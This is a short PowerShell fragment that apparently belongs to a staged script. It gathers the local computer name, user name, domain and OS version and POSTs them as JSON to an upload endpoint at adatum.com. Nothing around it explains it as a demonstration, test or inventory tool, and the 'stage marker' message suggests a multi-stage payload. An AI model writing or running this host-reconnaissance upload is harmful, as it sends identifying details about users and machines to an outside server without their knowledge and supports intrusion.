
$ProfileData = [ordered]@{ ComputerName = $env:COMPUTERNAME; UserName = $env:USERNAME; Domain = $env:USERDOMAIN; OSVersion = [Environment]::OSVersion.VersionString }
Invoke-RestMethod -Uri 'http://adatum.com/upload' -Method Post -Body ($ProfileData | ConvertTo-Json) -ContentType "application/json"
Write-Verbose "stage marker 6 reached"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
